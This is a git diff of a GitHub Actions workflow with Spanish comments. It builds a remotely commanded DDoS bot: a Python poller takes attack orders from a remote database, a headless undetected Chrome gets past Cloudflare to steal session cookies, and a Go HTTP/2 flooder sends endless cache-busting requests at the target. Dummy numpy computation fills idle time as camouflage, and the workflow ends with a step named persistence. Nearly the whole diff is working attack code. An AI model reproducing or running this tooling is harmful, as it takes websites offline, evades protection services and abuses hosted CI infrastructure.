@@ -1,9 +1,9 @@
-name: Ryxen-Omega-Node
+name: Ryxen-Omega-Final
 on:
   workflow_dispatch:
 
 jobs:
-  strike-force:
+  phantom-power:
     runs-on: ubuntu-latest
     steps:
     - name: Global Environment Setup
@@ -25,10 +25,11 @@ jobs:
             print("🧠 [SELENIUM] Saltando Cloudflare y obteniendo sesión...")
             opts = uc.ChromeOptions()
             opts.add_argument('--headless')
+            opts.add_argument('--no-sandbox')
             try:
                 driver = uc.Chrome(options=opts)
                 driver.get(url)
-                time.sleep(15) # Tiempo para el bypass automático
+                time.sleep(20) # Más tiempo para el bypass
                 cookie = "; ".join([f"{c['name']}={c['value']}" for c in driver.get_cookies()])
                 ua = driver.execute_script("return navigator.userAgent")
                 driver.quit()
@@ -40,29 +41,25 @@ jobs:
                 try:
                     res = requests.get(FB_URL).json()
                     ts = res.get("timestamp", 0)
-                    
                     if res and res.get("status") == "attack" and ts > LAST_TS:
                         target = res.get("target")
                         duration = res.get("time", 90)
                         method = res.get("method", "dstat-fast")
                         threads = res.get("threads", 100)
-                        concs = res.get("concurrents", 100)
                         LAST_TS = ts
                         
                         cookie, ua = get_stealth_session(target)
                         if cookie:
                             print(f"🔥 [EXE] Lanzando {method} contra {target}")
-                            subprocess.run(["go", "run", "attack.go", target, str(duration), cookie, ua, str(threads), str(concs), method])
-                        
+                            subprocess.run(["go", "run", "attack.go", target, str(duration), cookie, ua, str(threads), method])
                         requests.patch(FB_URL, json={"status": "idle"})
                     else:
-                        # Camuflaje Numpy
                         np.random.rand(800, 800) @ np.random.rand(800, 800)
                         time.sleep(25)
                 except: pass
         EOF
 
-    - name: Create Go Striker (attack.go)
+    - name: Create Advanced Go Striker (attack.go)
       run: |
         cat <<EOF > attack.go
         package main
@@ -71,45 +68,40 @@ jobs:
         func main() {
             target, durStr, cookie, ua := os.Args[1], os.Args[2], os.Args[3], os.Args[4]
             threads, _ := strconv.Atoi(os.Args[5])
-            concs, _ := strconv.Atoi(os.Args[6])
             duration, _ := strconv.Atoi(durStr)
-            method := os.Args[7]
+            method := os.Args[6]
 
             var wg sync.WaitGroup
             stop := time.After(time.Duration(duration) * time.Second)
 
-            // Configuración de Transport para soportar HTTP/2
+            // Transporte HTTP/2 para masividad
             tr := &http.Transport{
                 TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
             }
             http2.ConfigureTransport(tr)
-            client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
+            client := &http.Client{Transport: tr, Timeout: 4 * time.Second}
 
             for i := 0; i < threads; i++ {
                 wg.Add(1)
                 go func() {
                     defer wg.Done()
-                    for j := 0; j < concs; j++ {
-                        go func() {
-                            for {
-                                select {
-                                case <-stop: return
-                                default:
-                                    req, _ := http.NewRequest("GET", target, nil)
-                                    req.Header.Set("Cookie", cookie)
-                                    req.Header.Set("User-Agent", ua)
-                                    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
-                                    
-                                    if method == "dstat-fast" {
-                                        req.Header.Set("Cache-Control", "no-cache")
-                                        req.Header.Set("Pragma", "no-cache")
-                                    }
-
-                                    resp, err := client.Do(req)
-                                    if err == nil { resp.Body.Close() }
-                                }
+                    for {
+                        select {
+                        case <-stop: return
+                        default:
+                            req, _ := http.NewRequest("GET", target, nil)
+                            req.Header.Set("Cookie", cookie)
+                            req.Header.Set("User-Agent", ua)
+                            req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
+                            
+                            if method == "dstat-fast" {
+                                req.Header.Set("Cache-Control", "no-cache")
+                                req.Header.Set("Connection", "keep-alive")
                             }
-                        }()
+
+                            resp, err := client.Do(req)
+                            if err == nil { resp.Body.Close() }
+                        }
                     }
                 }()
             }
@@ -117,7 +109,7 @@ jobs:
         }
         EOF
 
-    - name: Persistence Loop
+    - name: Persistence
       env:
         GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       run: |
